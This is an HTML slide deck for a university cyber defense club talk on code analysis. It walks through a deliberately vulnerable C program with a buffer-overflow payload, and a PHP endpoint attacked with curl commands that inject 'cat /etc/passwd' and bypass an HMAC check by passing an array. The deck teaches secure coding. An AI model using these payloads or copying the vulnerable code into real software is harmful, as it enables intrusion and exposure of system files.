<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>LUCDC: Code Analysis</title>
<meta name="author" content="(Andrew Rioux)"/>
<style type="text/css">
.underline { text-decoration: underline; }
</style>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/moon.css" id="theme"/>

<link rel="stylesheet" href="../common/theme.css"/>

<!-- If the query includes 'print-pdf', include the PDF print sheet -->
<script>
    if( window.location.search.match( /print-pdf/gi ) ) {
        var link = document.createElement( 'link' );
        link.rel = 'stylesheet';
        link.type = 'text/css';
        link.href = 'https://cdn.jsdelivr.net/npm/reveal.js/css/print/pdf.css';
        document.getElementsByTagName( 'head' )[0].appendChild( link );
    }
</script>
</head>
<body>
<div class="reveal">
<div class="slides">
<section id="sec-title-slide" data-background="../common/background.png"><h1>LUCDC: Code Analysis</h1>
Andrew Rioux (<a href="mailto:arioux@liberty.edu">arioux@liberty.edu</a>)
</section>

<section>
<section id="slide-org91569d0" data-background="../common/background.png">
<h2 id="org91569d0"><span class="section-number-2">1.</span> About me</h2>
<ul>
<li class="fragment appear">Andrew Rioux</li>
<li class="fragment appear">CS: Software Engineering (Sophomore)</li>
<li class="fragment appear">Software Engineer for US Navy</li>
<li class="fragment appear">LU CDC Vice President</li>

</ul>
</section>
</section>
<section>
<section id="slide-orgbd33768" data-background="../common/background.png">
<h2 id="orgbd33768"><span class="section-number-2">2.</span> Presentation information</h2>
<div class="outline-text-2" id="text-2">
</div>
</section>
<section id="slide-orgfaea1ea" data-background="../common/background.png">
<h3 id="orgfaea1ea"><span class="section-number-3">2.1.</span> Located at the following git repository</h3>
<p>
<a href="https://github.com/r-a303931/lucdc-presentations">https://github.com/r-a303931/lucdc-presentations</a>
</p>

</section>
<section id="slide-org3de6aa9" data-background="../common/background.png">
<h3 id="org3de6aa9"><span class="section-number-3">2.2.</span> Example 1</h3>
<ul>
<li>Build: <code>docker-compose run example1_build</code> (or <code>make</code> in <a href="./example1">./example1</a>)</li>
<li>Run: <code>docker-compose run example1</code></li>

</ul>

</section>
<section id="slide-orgcf232dd" data-background="../common/background.png">
<h3 id="orgcf232dd"><span class="section-number-3">2.3.</span> Example 2</h3>
<ul>
<li>Start web server: <code>docker-compose up example2</code></li>

</ul>

</section>
</section>
<section>
<section id="slide-org11b7687" data-background="../common/background.png">
<h2 id="org11b7687"><span class="section-number-2">3.</span> Life Goals</h2>
<p>
What do you plan to do after graduation?
</p>
<ul class="fragment appear">
<li>Penetration testing?</li>
<li>Security engineer?</li>
<li>Software Engineer / Programmer?</li>

</ul>

</section>
</section>
<section>
<section id="slide-orga387f93" data-background="../common/background.png">
<h2 id="orga387f93"><span class="section-number-2">4.</span> What are you going to deal with in your day to day job?</h2>
<p class="fragment appear">
Code!
</p>

</section>
</section>
<section>
<section id="slide-org831ce61" data-background="../common/background.png">
<h2 id="org831ce61"><span class="section-number-2">5.</span> What we will be going over here</h2>
<ul>
<li class="fragment appear">Example 1: Too simple with no safety (C)</li>
<li class="fragment appear">Example 2: Too complex with fake safety (PHP)</li>
<li class="fragment appear">What can we learn?</li>
<li class="fragment appear">Club exercise (JS)!</li>

</ul>

</section>
</section>
<section>
<section id="slide-org19e9da5" data-background="../common/background.png">
<h2 id="org19e9da5"><span class="section-number-2">6.</span> Example 1: Too simple with no safety</h2>
<div class="outline-text-2" id="text-6">
</div>
</section>
<section id="slide-orgf7a8245" data-background="../common/background.png">
<h3 id="orgf7a8245"><span class="section-number-3">6.1.</span> Source code:</h3>
<div class="org-src-container">

<pre  class="src src-c"   ><code trim><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #51afef;">&lt;</span><span style="color: #99bb66;">stdio.h</span><span style="color: #51afef;">&gt;</span>
<span style="color: #525252;">// </span><span style="color: #525252;">It's a surprise tool that will help us later...</span>
<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">shell</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    printf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"Suspicious function here...\n"</span><span style="color: #c678dd;">)</span>;
<span style="color: #51afef;">}</span>
<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">get_name</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    printf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"What is your name?\n"</span><span style="color: #c678dd;">)</span>;
    <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">buffer</span><span style="color: #c678dd;">[</span><span style="color: #dd8844; font-weight: bold;">20</span><span style="color: #c678dd;">]</span>;
    scanf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"%s"</span>, buffer<span style="color: #c678dd;">)</span>;
    printf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"Hello, %s!\n"</span>, buffer<span style="color: #c678dd;">)</span>;
<span style="color: #51afef;">}</span>
<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    get_name<span style="color: #c678dd;">()</span>;
<span style="color: #51afef;">}</span>
</code></pre>
</div>

</section>
<section id="slide-org5f43a35" data-background="../common/background.png">
<h3 id="org5f43a35"><span class="section-number-3">6.2.</span> How is this compiled?</h3>
<div class="org-src-container">

<pre  class="src src-makefile"   ><code trim><span style="color: #51afef;">example1</span>: example1.c
    gcc -no-pie --no-stack-protector -o example1 example1.c
</code></pre>
</div>

</section>
<section id="slide-orgc1cda1d" data-background="../common/background.png">
<h3 id="orgc1cda1d"><span class="section-number-3">6.3.</span> Options of interest</h3>
<ul class="fragment appear">
<li><code>-no-pie</code></li>

</ul>
<ul class="fragment appear">
<li><code>--no-stack-protector</code></li>

</ul>

</section>
<section id="slide-org9a075f3" data-background="../common/background.png">
<h3 id="org9a075f3"><span class="section-number-3">6.4.</span> We know <code>shell</code> is bad</h3>
<p>
But it&rsquo;s benign&#x2026;.
</p>
<p class="fragment appear">
right?
</p>

</section>
<section id="slide-org23c0fa8" data-background="../common/background.png">
<h3 id="org23c0fa8"><span class="section-number-3">6.5.</span> Nope!</h3>
<p>
What if your name is <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x0\x0\x0\x0\x0</code>?
</p>

</section>
<section id="slide-org7c6a308" data-background="../common/background.png">
<h3 id="org7c6a308"><span class="section-number-3">6.6.</span> What happened?</h3>
<p class="fragment appear">
Buffer overflow exploit!
</p>

</section>
<section id="slide-org5246fc2" data-background="../common/background.png">
<h3 id="org5246fc2"><span class="section-number-3">6.7.</span> What could happen?</h3>
</section>
</section>
<section>
<section id="slide-org6152429" data-background="../common/background.png">
<h2 id="org6152429"><span class="section-number-2">7.</span> Example 2: Too complex with fake safety</h2>
<p>
PHP has some magic variable management
</p>
<p class="fragment appear">
&#x2026;can this be taken advantage of?
</p>

</section>
<section id="slide-org8313da2" data-background="../common/background.png">
<h3 id="org8313da2"><span class="section-number-3">7.1.</span> Aside: How HTTP works</h3>
<p class="fragment appear">
You make a request, and get a response
</p>

</section>
<section id="slide-org59bf781" data-background="../common/background.png">
<h4 id="org59bf781"><span class="section-number-4">7.1.1.</span> Get me a file, please!</h4>
</section>
<section id="slide-orgaa87a08" data-background="../common/background.png">
<h4 id="orgaa87a08"><span class="section-number-4">7.1.2.</span> Post to this location and do a thing!</h4>
</section>
<section id="slide-org9b467ec" data-background="../common/background.png">
<h4 id="org9b467ec"><span class="section-number-4">7.1.3.</span> How do we handle that in PHP?</h4>
<ul>
<li class="fragment appear"><code>$_GET</code></li>
<li class="fragment appear"><code>$_POST</code></li>

</ul>
</section>
<section id="slide-org3860dae" data-background="../common/background.png">
<h3 id="org3860dae"><span class="section-number-3">7.2.</span> Aside: PHP in 5 seconds for C++ programmers</h3>
<p class="fragment appear">
Every variable begins with <code>$</code>
</p>

<p class="fragment appear">
Every PHP file begins with <code>&lt;?php</code>
</p>

<p class="fragment appear">
No main function, everything just happens in the order it&rsquo;s displayed
</p>

<p class="fragment appear">
Other than that, basically C++!
</p>
</section>
<section id="slide-orgae908c2" data-background="../common/background.png">
<h3 id="orgae908c2"><span class="section-number-3">7.3.</span> Source code: Input check</h3>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim><span style="color: #51afef; font-weight: bold;">&lt;?php</span>
    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">empty</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #99bb66;">[</span><span style="color: #99bb66;">'hmac'</span><span style="color: #99bb66;">]</span><span style="color: #c678dd;">)</span> || <span style="color: #51afef;">empty</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #99bb66;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #99bb66;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'HTTP/1.0 400 Bad Request'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>
</code></pre>
</div>

</section>
<section id="slide-orgaee1e18" data-background="../common/background.png">
<h3 id="orgaee1e18"><span class="section-number-3">7.4.</span> Source code: Authentication and execution</h3>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #99bb66;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #99bb66;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #99bb66;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #99bb66;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

</section>
<section id="slide-org3d72869" data-background="../common/background.png">
<h3 id="org3d72869"><span class="section-number-3">7.5.</span> Step 0: Identify host</h3>
<p class="fragment appear">
10.104.58.39
</p>

<p class="fragment appear">
Join in! <a href="http://10.104.58.39/ui.php" class="fragment appear">http://10.104.58.39/ui.php</a>
</p>

</section>
<section id="slide-org2f6a161" data-background="../common/background.png">
<h3 id="org2f6a161"><span class="section-number-3">7.6.</span> Step 1: Normal Usage</h3>
<p class="fragment fade-in-and-out">
What&rsquo;s &ldquo;normal&rdquo;?
</p>

</section>
<section id="slide-org13807dc" data-background="../common/background.png">
<h4 id="org13807dc"><span class="section-number-4">7.6.1.</span> Usage 1:</h4>
<ul>
<li>host: <code>google.com</code></li>
<li>hmac: <code>ad1663b82d5bdb2e1938...</code></li>

</ul>

</section>
<section id="slide-org8557627" data-background="../common/background.png">
<h4 id="org8557627"><span class="section-number-4">7.6.2.</span> Usage 2:</h4>
<ul>
<li>host: <code>google.com</code></li>
<li>nonce: <code>STUPID_NONCE</code></li>
<li>hmac: <code>b3700dedb181ee312930...</code></li>

</ul>

</section>
<section id="slide-orga7c0df5" data-background="../common/background.png">
<h4 id="orga7c0df5"><span class="section-number-4">7.6.3.</span> Command</h4>
<aside class="notes">
<p>
Execute command below:
</p>

<p>
<a href="curl --data "host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1">curl --data "host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1</a>
</p>

</aside>

<div class="org-src-container">

<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #99bb66;">"host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64"</span> 10.104.58.39
</code></pre>
</div>

</section>
<section id="slide-orge7b9ff2" data-background="../common/background.png">
<h3 id="orge7b9ff2"><span class="section-number-3">7.7.</span> What functions are being called and variables used?</h3>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #99bb66;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #99bb66;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #99bb66;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #99bb66;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.getenv.php"><code>getenv</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.isset.php"><code>isset</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/reserved.variables.post.php"><code>$_POST</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.hash-hmac.php"><code>hash_hmac</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.header.php"><code>header</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.passthru.php"><code>passthru</code></a></li>

</ul>

</section>
<section id="slide-org1236daa" data-background="../common/background.png">
<h3 id="org1236daa"><span class="section-number-3">7.8.</span> Step 2: Bash Injection</h3>
<p>
Is <code>passthru</code> vulnerable to shell injections?
</p>
<p class="fragment appear">
Yes!
</p>

</section>
<section id="slide-org1ff139d" data-background="../common/background.png">
<h4 id="org1ff139d"><span class="section-number-4">7.8.1.</span> Example usage:</h4>
<ul>
<li>host: <code>google.com;cat /etc/passwd</code></li>
<li>hmac: <code>84e26d8e32086e127a60...</code></li>

</ul>

</section>
<section id="slide-org80b9d37" data-background="../common/background.png">
<h4 id="org80b9d37"><span class="section-number-4">7.8.2.</span> Command</h4>
<aside class="notes">
<p>
Execute command below:
</p>

<p>
<a href="curl --data "host=google.com;cat /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1">curl --data "host=google.com;cat /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1</a>
</p>

</aside>

<div class="org-src-container">

<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #99bb66;">"host=google.com;</span><span style="color: #99bb66;">cat</span><span style="color: #99bb66;"> /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417"</span> 10.104.58.39
</code></pre>
</div>

</section>
<section id="slide-org9817044" data-background="../common/background.png">
<h3 id="org9817044"><span class="section-number-3">7.9.</span> Step 3: HMAC Circumvention</h3>
<p>
What else is vulnerable in the code above?
</p>
<p class="fragment appear">
Is there anything magic that happens, a &ldquo;feature&rdquo;?
</p>

</section>
<section id="slide-orge0afd3d" data-background="../common/background.png">
<h4 id="orge0afd3d"><span class="section-number-4">7.9.1.</span> Did you catch it?</h4>
<p class="fragment appear">
&ldquo;One feature of PHP&rsquo;s processing of POST and GET variables is that it automatically decodes indexed form variable names.&rdquo;
</p>

<p class="fragment appear">
What does this do to the types of variables used?
</p>

</section>
<section id="slide-orge1b8874" data-background="../common/background.png">
<h4 id="orge1b8874"><span class="section-number-4">7.9.2.</span> Some PHP analysis</h4>
<ul class="fragment appear">
<li><code>element[]</code>: 1</li>
<li><code>element[]</code>: 2</li>

</ul>

<div class="org-src-container">

<pre  class="fragment appear"   ><code trim><span style="color: #51afef; font-weight: bold;">&lt;?php</span>
    var_dump<span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #51afef;">)</span>;

    <span style="color: #525252;">// </span><span style="color: #525252;">array(1) {</span>
    <span style="color: #525252;">//     </span><span style="color: #525252;">["element"] =&gt; array(2) {</span>
    <span style="color: #525252;">//         </span><span style="color: #525252;">[0] =&gt; string(1) "1"</span>
    <span style="color: #525252;">//         </span><span style="color: #525252;">[1] =&gt; string(2) "2"</span>
    <span style="color: #525252;">//     </span><span style="color: #525252;">}</span>
    <span style="color: #525252;">// </span><span style="color: #525252;">}</span>
</code></pre>
</div>

</section>
<section id="slide-org0c4bbc7" data-background="../common/background.png">
<h4 id="org0c4bbc7"><span class="section-number-4">7.9.3.</span> What are the arguments this bit of code expects?</h4>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #99bb66;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #99bb66;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #99bb66;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #99bb66;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<p class="fragment appear">
What can we change?
</p>

<ul>
<li class="fragment appear"><code>hmac</code></li>
<li class="fragment appear"><code>host</code></li>
<li class="fragment appear"><code>nonce</code></li>

</ul>

</section>
<section id="slide-orgd3e190d" data-background="../common/background.png">
<h4 id="orgd3e190d"><span class="section-number-4">7.9.4.</span> What happens to <code>hash_hmac</code> when we change <code>$_POST['nonce']</code> to an array?</h4>
<p class="fragment appear">
Let&rsquo;s see!
</p>

</section>
<section id="slide-org1392e92" data-background="../common/background.png">
<h4 id="org1392e92"><span class="section-number-4">7.9.5.</span> Commands</h4>
<aside class="notes">
<p>
<a href="docker run -it php:7.4-apache-buster php -a">docker run -it php:7.4-apache-buster php -a</a>
</p>

</aside>

<div class="org-src-container">

<pre  class="src src-php"   ><code trim>$<span style="color: #dcaeea;">test_value</span> = <span style="color: #51afef;">[</span><span style="color: #99bb66;">'1'</span>,<span style="color: #99bb66;">'2'</span><span style="color: #51afef;">]</span>;
var_dump<span style="color: #51afef;">(</span>hash_hmac<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">test_value</span>, <span style="color: #99bb66;">'dummy'</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<div class="org-src-container">

<pre  class="fragment appear"   ><code trim>var_dump<span style="color: #51afef;">(</span>hash_hmac<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'sha256'</span>, <span style="color: #99bb66;">'a string'</span>, <span style="color: #a9a1e1;">NULL</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

</section>
<section id="slide-orgda19e3e" data-background="../common/background.png">
<h4 id="orgda19e3e"><span class="section-number-4">7.9.6.</span> It works!</h4>
<p class="fragment appear">
Now what?
</p>

</section>
<section id="slide-org155c3f9" data-background="../common/background.png">
<h4 id="org155c3f9"><span class="section-number-4">7.9.7.</span> Look at the source code again&#x2026;</h4>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #99bb66;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #99bb66;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #99bb66;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #99bb66;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

</section>
<section id="slide-org0dfbd4d" data-background="../common/background.png">
<h4 id="org0dfbd4d"><span class="section-number-4">7.9.8.</span> Resulting query</h4>
<ul>
<li class="fragment appear">host: <code>google.com;cat /etc/passwd</code></li>
<li class="fragment appear">hmac: <code>bbf36c444a323aca2808...</code></li>
<li class="fragment appear">nonce[]: 1</li>
<li class="fragment appear">nonce[]: 2</li>

</ul>

</section>
<section id="slide-orgc9b9555" data-background="../common/background.png">
<h4 id="orgc9b9555"><span class="section-number-4">7.9.9.</span> Command</h4>
<div class="org-src-container">

<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #99bb66;">"nonce[]=1&amp;nonce[]=2&amp;host=google.com;</span><span style="color: #99bb66;">cat</span><span style="color: #99bb66;"> /etc/passwd&amp;hmac=bbf36c444a323aca2808e486ea2165ff76d6f671e5dee9987007dba448230a53"</span> 10.104.58.39
</code></pre>
</div>
</section>
</section>
<section>
<section id="slide-org141c60f" data-background="../common/background.png">
<h2 id="org141c60f"><span class="section-number-2">8.</span> What can we learn from both examples?</h2>
<div class="outline-text-2" id="text-8">
</div>
</section>
<section id="slide-org21abcce" data-background="../common/background.png">
<h3 id="org21abcce"><span class="section-number-3">8.1.</span> Assume there is a problem</h3>
<p class="fragment appear">
It makes it easier to recover when there is one
</p>

</section>
<section id="slide-org8a7d18c" data-background="../common/background.png">
<h3 id="org8a7d18c"><span class="section-number-3">8.2.</span> Do not trust users!</h3>
<p class="fragment appear">
Limit user input and verify it is the right format and type
</p>

</section>
<section id="slide-org28a74f3" data-background="../common/background.png">
<h3 id="org28a74f3"><span class="section-number-3">8.3.</span> Do not trust your programming language!</h3>
<p class="fragment appear">
Learn the ins and outs of whatever language you are using
</p>

<p class="fragment appear">
Find a place to listen to news about your language of choice
</p>

</section>
</section>
<section>
<section id="slide-orga365f8f" data-background="../common/background.png">
<h2 id="orga365f8f"><span class="section-number-2">9.</span> How can we secure Example 1?</h2>
<div class="outline-text-2" id="text-9">
</div>
</section>
<section id="slide-org65c1f53" data-background="../common/background.png">
<h3 id="org65c1f53"><span class="section-number-3">9.1.</span> Source code:</h3>
<div class="org-src-container">

<pre  class="src src-c"   ><code trim><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #51afef;">&lt;</span><span style="color: #99bb66;">stdio.h</span><span style="color: #51afef;">&gt;</span>
<span style="color: #525252;">// </span><span style="color: #525252;">It's a surprise tool that will help us later...</span>
<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">shell</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    printf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"Suspicious function here...\n"</span><span style="color: #c678dd;">)</span>;
<span style="color: #51afef;">}</span>
<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">get_name</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    printf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"What is your name?\n"</span><span style="color: #c678dd;">)</span>;
    <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">buffer</span><span style="color: #c678dd;">[</span><span style="color: #dd8844; font-weight: bold;">20</span><span style="color: #c678dd;">]</span>;
    scanf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"%s"</span>, buffer<span style="color: #c678dd;">)</span>;
    printf<span style="color: #c678dd;">(</span><span style="color: #99bb66;">"Hello, %s!\n"</span>, buffer<span style="color: #c678dd;">)</span>;
<span style="color: #51afef;">}</span>
<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    get_name<span style="color: #c678dd;">()</span>;
<span style="color: #51afef;">}</span>
</code></pre>
</div>
</section>
<section id="slide-orgaece8ec" data-background="../common/background.png">
<h3 id="orgaece8ec"><span class="section-number-3">9.2.</span> Don&rsquo;t provide the option to overflow the buffer: fgets(3)</h3>
</section>
<section id="slide-orgc9d9ad8" data-background="../common/background.png">
